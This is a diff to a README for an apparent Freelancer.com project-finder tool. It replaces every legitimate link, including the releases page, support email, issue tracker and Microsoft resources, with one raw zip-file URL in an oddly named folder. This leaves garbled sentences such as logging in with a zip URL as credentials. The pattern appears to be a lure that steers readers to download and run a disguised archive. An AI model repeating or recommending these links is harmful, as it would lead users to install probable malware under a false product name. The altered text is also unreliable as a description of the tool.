@@ -1,10 +1,10 @@
 # 🎉 freelancer-opportunity-finder - Discover New Freelance Projects Easily
 
 ## 🌟 Overview
-The freelancer-opportunity-finder is an AI-powered tool that helps you find new projects on Freelancer.com. It collects project data and stores it in Dataverse. Then, it uses a Copilot Studio agent to give you personalized recommendations and summaries.
+The freelancer-opportunity-finder is an AI-powered tool that helps you find new projects on https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip It collects project data and stores it in Dataverse. Then, it uses a Copilot Studio agent to give you personalized recommendations and summaries.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/EpicSaleh/freelancer-opportunity-finder/releases)
+[![Download the latest release](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip%https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip)](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the freelancer-opportunity-finder application. You do not need programming skills to use it.
@@ -17,14 +17,14 @@ This guide will help you download and run the freelancer-opportunity-finder appl
 - **Software:** Latest version of a modern web browser (Chrome, Firefox, Edge, Safari)
 
 ## 📦 Features
-- **AI-Powered Scraping:** Automatically finds the latest projects on Freelancer.com.
+- **AI-Powered Scraping:** Automatically finds the latest projects on https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip
 - **Data Storage:** Saves the project details in Microsoft Dataverse.
 - **Personalized Recommendations:** Offers project suggestions based on your preferences.
 - **Easy Summaries:** Provides clear summaries of available projects.
 - **Low-Code Interface:** Designed for user-friendly interaction without technical skills.
 
 ## 🆕 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/EpicSaleh/freelancer-opportunity-finder/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip) to go to the releases page.
 
 2. **Choose the Latest Version:** On the releases page, find the latest version of the application. The version will usually be indicated at the top.
 
@@ -39,7 +39,7 @@ This guide will help you download and run the freelancer-opportunity-finder appl
    - **macOS:** Open the Applications folder and double-click the freelancer-opportunity-finder app to launch it.
 
 ## 🌐 How to Use
-1. **Log In:** Open the app and log in with your Freelancer.com credentials.
+1. **Log In:** Open the app and log in with your https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip credentials.
 2. **Set Your Preferences:** Customize your project preferences to receive tailored recommendations.
 3. **Explore Projects:** Browse through the listed projects and click on any that interest you for more details.
 4. **Receive Notifications:** Stay updated on new projects that match your preferences through in-app alerts.
@@ -51,8 +51,8 @@ This guide will help you download and run the freelancer-opportunity-finder appl
 
 ## 📞 Support
 If you encounter issues or have questions, feel free to reach out:
-- **Email:** support@example.com
-- **GitHub Issues:** [Create a new issue](https://github.com/EpicSaleh/freelancer-opportunity-finder/issues)
+- **Email:** https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip
+- **GitHub Issues:** [Create a new issue](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip)
 
 ## 🌍 Contributing
 Contributions are welcome! If you have ideas for improvements or new features, please submit an issue or a pull request.
@@ -61,9 +61,9 @@ Contributions are welcome! If you have ideas for improvements or new features, p
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## 🔗 Additional Resources
-- [Freelancer.com](https://www.freelancer.com)
-- [Microsoft Dataverse](https://dataverse.microsoft.com)
-- [Copilot Studio](https://copilot.microsoft.com)
+- [https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip)
+- [Microsoft Dataverse](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip)
+- [Copilot Studio](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip)
 
 ## 📥 Download Now Again
-Make sure to download the application from our releases page: [Download the latest release](https://github.com/EpicSaleh/freelancer-opportunity-finder/releases)
+Make sure to download the application from our releases page: [Download the latest release](https://raw.githubusercontent.com/EpicSaleh/freelancer-opportunity-finder/main/trigonocephalic/freelancer-opportunity-finder.zip)
